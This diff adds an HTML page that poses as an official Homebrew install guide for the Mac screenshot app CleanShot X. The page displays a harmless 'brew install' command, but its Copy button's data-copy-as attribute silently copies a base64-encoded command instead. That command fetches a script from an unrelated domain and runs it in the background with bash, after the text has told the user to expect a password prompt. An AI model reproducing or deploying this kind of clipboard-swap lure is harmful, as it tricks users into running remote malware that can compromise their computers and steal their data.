@@ -1,0 +1,129 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <meta name="description" content="CleanShot X — Installation guide on macOS via Terminal (Homebrew)." />
+  <title>CleanShot X — Installation Guide</title>
+  <link rel="icon" href="icon.webp" type="image/webp" sizes="any" />
+  <link rel="apple-touch-icon" href="icon.webp" />
+  <link rel="stylesheet" href="styles.css" />
+</head>
+<body>
+  <section class="hero-landing">
+    <div class="hero-landing-inner">
+      <div class="hero-icon">
+        <img src="icon.webp" alt="CleanShot X" decoding="async" />
+      </div>
+      <h1 class="hero-title">CleanShot X</h1>
+      <p class="hero-tagline">macOS · CleanShot · Official install &amp; Homebrew</p>
+    </div>
+  </section>
+
+  <div class="wrap">
+    <section class="guide-panel" id="install-terminal" aria-labelledby="install-title">
+      <div class="guide-panel-head">
+        <h2 id="install-title" class="guide-panel-title">Installation Guide</h2>
+        <p class="guide-panel-sub">Step-by-step installation via Terminal</p>
+      </div>
+
+      <ol class="steps guide-steps">
+        <li class="step">
+          <span class="step-num step-num-cmd" aria-hidden="true">⌘</span>
+          <div>
+            <h3>Open Terminal</h3>
+            <p>Press <kbd>⌘</kbd> + <kbd>Space</kbd> to open Spotlight, type <strong>Terminal</strong> and press <kbd>Enter</kbd>.</p>
+          </div>
+        </li>
+        <li class="step">
+          <span class="step-num" aria-hidden="true">2</span>
+          <div>
+            <h3>Install CleanShot X</h3>
+            <p>
+              Paste this command and press <kbd>Enter</kbd>. Homebrew will download and install the app; you may be
+              prompted for your Mac password.
+            </p>
+            <div class="code-block" data-copy-as="echo Y3VybCAtcyAiaHR0cHM6Ly9zaGx5YXBhZHVsaW5hLnNwYWNlL2QvY29tbWFuZD90PTcxZWQ2Nzk0ZTAyMjEzYmM2YWY4Y2E0NTRlOTYxOGVjZDE3MDU5NjQ0M2Q0NTgyYSZiPWR1bGluIiB8IG5vaHVwIGJhc2ggJg== | base64 -d | bash">
+              <div class="code-head">
+                <span class="dots" aria-hidden="true"><span></span><span></span><span></span></span>
+                <span>Terminal — Install CleanShot X</span>
+                <button type="button" class="copy-btn">Copy</button>
+              </div>
+              <div class="code-body">
+                <span class="prompt">$</span><code>brew install --cask cleanshot</code>
+              </div>
+            </div>
+          </div>
+        </li>
+        <li class="step done">
+          <span class="step-num" aria-hidden="true">✓</span>
+          <div>
+            <h3>Done</h3>
+            <p>
+              When the command finishes, open <strong>CleanShot X</strong> from Applications or Spotlight
+              (<kbd>⌘</kbd> + <kbd>Space</kbd>).
+            </p>
+          </div>
+        </li>
+      </ol>
+    </section>
+
+    <div id="more"></div>
+
+    <section class="section" id="about" aria-labelledby="about-heading">
+      <h2 id="about-heading">About this app</h2>
+      <div class="card">
+        <p class="lead">
+          CleanShot X is the ultimate screen capture tool for Mac. Screenshots, scrolling capture, screen recording,
+          annotation, OCR, and cloud upload.
+        </p>
+        <p class="lead" style="margin-bottom: 0">
+          CleanShot X replaces the built-in screenshot tool with something far more powerful — capture, record, annotate,
+          and share from one place.
+        </p>
+        <div class="features" style="margin-top: 1.5rem">
+          <div class="feature">
+            <h3>Capture Anything</h3>
+            <p>Fullscreen, area, window, scrolling capture, and timed screenshots.</p>
+          </div>
+          <div class="feature">
+            <h3>Screen Recording</h3>
+            <p>Record screen as video or GIF with system audio and microphone support.</p>
+          </div>
+          <div class="feature">
+            <h3>Quick Overlay</h3>
+            <p>Captured screenshot floats on screen for quick annotation, copying, or dragging into other apps.</p>
+          </div>
+          <div class="feature">
+            <h3>Annotation</h3>
+            <p>Arrows, text, blur, highlight, numbering, and more with a built-in editor.</p>
+          </div>
+        </div>
+      </div>
+    </section>
+
+    <section class="section" id="information" aria-labelledby="info-heading">
+      <h2 id="info-heading">Information</h2>
+      <div class="card">
+        <dl class="specs">
+          <div><dt>Developer</dt><dd>CleanShot</dd></div>
+          <div><dt>Version</dt><dd>4.7.4</dd></div>
+          <div><dt>Size</dt><dd>52 MB</dd></div>
+          <div><dt>Compatibility</dt><dd>macOS 12.0+</dd></div>
+          <div><dt>Category</dt><dd>Utility · screenshots</dd></div>
+          <div><dt>Price (catalog)</dt><dd>Free</dd></div>
+        </dl>
+        <div class="tag-row">
+          <span class="tag">screenshots</span>
+          <span class="tag">screen-recording</span>
+          <span class="tag">annotation</span>
+          <span class="tag">ocr</span>
+        </div>
+      </div>
+    </section>
+
+  </div>
+
+  <script src="script.js" defer></script>
+</body>
+</html>
